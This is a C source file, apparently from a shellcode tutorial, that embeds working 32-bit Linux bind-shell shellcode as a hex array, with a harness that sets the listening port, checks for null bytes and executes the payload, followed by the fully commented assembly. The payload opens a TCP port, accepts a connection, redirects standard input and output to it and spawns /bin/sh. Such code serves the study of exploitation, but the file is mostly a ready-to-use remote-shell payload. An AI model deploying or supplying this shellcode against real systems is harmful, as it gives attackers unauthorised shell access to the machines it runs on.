/*===================================================================*/
/*
  Filename: bindshell.c
  Author: JollyFrogs (LookoutFrog@gmail.com)

  License: This work is licensed under a Creative Commons
  Attribution-NonCommercial 4.0 International License.

  Compile:
  gcc -m32 -fno-stack-protector -z execstack bindshell.c -o bindshell
*/

#include <stdio.h>
#include <string.h>
#include <stdbool.h>

unsigned char shellcode[] = \
"\x31\xc0\x50\x40\x50\x5b\x50\x40\x50\xb0\x66\x89\xe1\xcd\x80\x97"
"\x5b\x58\x66\xb8\x15\xb3\x66\x50\x66\x53\x89\xe1\x31\xc0\xb0\x10"
"\x50\x51\x57\xb0\x66\x89\xe1\xcd\x80\x50\x57\xb0\x66\x43\x43\x89"
"\xe1\xcd\x80\xb0\x66\x43\xcd\x80\x93\x87\xcf\x49\xb0\x3f\xcd\x80"
"\x75\xf9\x50\x59\x50\x5a\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x87\xe3\xcd\x80";

static bool shellcode_zerocheck() {
    // initialize counter
    int i = 0;
    // check each byte in shellcode array for hexidecimal zero value, return false if zero found
    for(i = 0; i < sizeof(shellcode)-1; i++) {if (shellcode[i] == '\x00') return false;}
    // Return true if no zeroes found
    return true;
}

static bool shellcode_setport(char *buf, int port) {
    // Check if decimal port is valid
    if (port<1024 || port>65535) return false;
    // The offset of the port is 21, but reduce by 1 since the array counts from 0
    int shellcode_port_offset = 20; // (\x15\xb3)
    // convert decimal port to hexidecimal
    *(short *)(buf+shellcode_port_offset) = port; // (\x15\xb3) - shellcode array counts from 0
    // Swap port bytes to accomodate for Little Endian memory structure
    char tmp = buf[shellcode_port_offset];
    buf[shellcode_port_offset] = buf[shellcode_port_offset+1];
    buf[shellcode_port_offset+1] = tmp;
    // Check if the hexidecimal port contains zeroes, if it does then show an error
    if (shellcode[20] == '\x00' || shellcode[21] == '\x00') {
     printf("port HEX contains zeroes\n"); return false;
    }
    // Return true if all checks passed
    return true;
}

main () {
    // Port in decimal - should be higher than 1024 and lower than 65536
    int port = 1234;
    // Basic error checking
    if (!shellcode_setport(shellcode, port)) {printf("ERROR: Invalid port\n");return 0;}
    if (!shellcode_zerocheck()) {printf("ERROR: Shellcode contains zeroes\n");return 0;}
    // Print shellcode length.
    printf("Shellcode Length:  %d\n", strlen(shellcode));
    // Run assembly commands
    __asm__ (
    // Initialize registers
     "movl $0x12345678, %eax\n\t"
     "movl $0x12345678, %ebx\n\t"
     "movl $0x12345678, %ecx\n\t"
     "movl $0x12345678, %edx\n\t"
     "movl $0x12345678, %edi\n\t"
     "movl $0x12345678, %esi\n\t"
     "movl $0x12345678, %ebp\n\t"
    // execute shellcode
     "jmp shellcode");
}

/* Assembly source of shellcode:

global _start

section .text
_start:
  ; parameters for SOCKET(2) are placed on the stack in reverse order
  ; SOCKET(2) Synopsis: int socket(int domain, int type, int protocol);
  ; Before instruction "int 0x80" the stack should look like:
  ; 02 00 00 00 01 00 00 00 00 00 00 00
  ; ^AF_INET    ^S_STREAM   ^TCP

  xor    eax, eax            ; EAX = 00000000
  push   eax                 ; PUSH 00000000 (TCP)
  inc    eax                 ; EAX = 00000001
  push   eax                 ; PUSH 00000001 (SOCK_STREAM)
  pop    ebx                 ; EBX = 00000001 (SOCKETCALL.SOCKET)
  push   eax                 ; PUSH 00000001 (SOCK_STREAM)
  inc    eax                 ; EAX = 00000002
  push   eax                 ; PUSH 00000002 (AF_INET)

  ; invoke socketcall to create the socket
  mov    al, 0x66            ; EAX = 00000066 (SOCKETCALL)

  mov    ecx, esp            ; ECX = points to top of stack (0xBFFFF3E4)

  int    0x80                ; SYSCALL SOCKETCALL(2)-SOCKET(2)

  xchg   edi, eax            ; store fd in edi

  ; parameters for BIND(2) are placed on the stack in reverse order
  ; BIND(2) Synopsis: int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
  ; Before instruction "int 0x80" the stack should look like:
  ; 07 00 00 00 xx xx xx xx 10 00 00 00 02 00 b3 15 00 00 00 00
  ; ^FD         ^           ^structlen  ^AFNT ^port ^in_addr
  ;             | PTR to ---------------^

  pop     ebx                ; EBX = 00000002 (SOCKETCALL.BIND)
  pop     eax                ; EAX = 00000001
  ; Note: Stack = 00000000
  mov     ax, 0xB315         ; EAX = 0000B315 (5555 reversed)
  push    ax                 ; PUSH B315      (sockaddr_2)
  push    bx                 ; PUSH 0002      (sockaddr_3)
  mov     ecx, esp           ; ECX = ESP (0xBFFFF3E8)
  xor     eax, eax           ; EAX = 00000000
  mov     al, 0x10           ; EAX = 00000010
  push    eax                ; PUSH 00000010  (len(sockaddr))
  push    ecx                ; PUSH (*ADDR)   (ptr to sockaddr)
  push    edi                ; push (FD)      (SOCKFD)

  ; invoke socketcall to bind the socket to IP and port
  mov     al, 0x66           ; EAX = 00000066 (SOCKETCALL)
  mov     ecx, esp           ; ECX = points to top of stack  (0xBFFFF3DC)

  int     0x80               ; SYSCALL SOCKETCALL(2)-BIND(2)

  ; parameters for LISTEN(2) are placed on the stack in reverse order
  ; LISTEN(2) Synopsis: listen(int sockfd, int backlog)
  ; Before instruction "int 0x80" the stack should look like:
  ; 07 00 00 00 00 00 00 00
  ; ^FD         ^Backlog = 0

  ; Note that EAX = 00000000 due to return code from SOCKETCALL above
  push    eax                ; PUSH 00000000  (Backlog)
  push    edi                ; PUSH (FD)      (SOCKFD)

  ; invoke socketcall to set the socket in listen mode
  mov     al, 0x66           ; EAX = 00000066 (SOCKETCALL)
  inc     ebx                ; EBX = 00000003
  inc     ebx                ; EBX = 00000004 (SOCKETCALL.LISTEN)
  mov     ecx, esp           ; ECX = points to top of stack (0xBFFFF3D4)
  int     0x80               ; SYSCALL SOCKETCALL(2)-LISTEN(2)
  ; Note: The selected port is opened on the system and listening

  ; parameters for ACCEPT(2) are placed on the stack in reverse order
  ; ACCEPT(2) Synopsis: int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
  ; Before instruction "int 0x80" the stack should look like:
  ; 07 00 00 00 00 00 00 00 00 00 00 00

  ; Note that EAX is set to 0 upon successful execution of SOCKETCALL.LISTEN
  ; Note that stack at 0xBFFFF3D4 already contains what I need:
  ; 07 00 00 00 00 00 00 00 00 00 00 00
  ; invoke socketcall to set the socket to accept connections
  mov     al, 0x66           ; EAX = 00000066 (SOCKETCALL)
  inc     ebx                ; EBX = 00000005 (SOCKETCALL.ACCEPT)
  int     0x80               ; SYSCALL SOCKETCALL(2)-ACCEPT(2)

  ; use syscal DUP2(2) to copy the stdin(0), stdout(1) and stderr(2)
  ; DUP2(2) Synopsis: int dup2(int oldfd, int newfd);
  xchg    eax, ebx           ; EBX = CFD, EAX = 00000005
  xchg    ecx, edi           ; ECX = 00000007
  ; XCHG ECX, EDI saves us having to zero out ecx and then MOV 3

redirect:
  dec     ecx                ; ECX = 00000002 (eventually)
  mov     al, 0x3f           ; DUP2(2) (3 times - ECX=2, ECX=1, ECX=0)
  int     0x80               ; SYSCALL DUP2(2) (ECX=2, ECX=1, ECX=0)
  jnz     redirect           ;

  ; spawn /bin/sh shell
  ; Note that EAX is set to 00000000 upon last succesful execution of DUP2
  push eax                   ; PUSH 00000000 (NULL byte)
  pop ecx                    ; ECX = 00000000 (EXECVE ARGV)
  push eax                   ; PUSH 00000000 (NULL byte)
  pop edx                    ; EDX = 00000000 (EXECVE ENVP)

  ; push '/bin//sh, 0' on stack
  push eax                   ; PUSH 00000000 (NULL byte)
  mov al, 0xb                ; EXECVE(2)
  push 0x68732f2f            ; "//sh"
  push 0x6e69622f            ; "/bin"

  xchg esp, ebx              ; Save a byte by sacrificing unneeded ESP

  int 0x80                   ; Start /bin/sh in the client socket FD
*/

/*===================================================================*/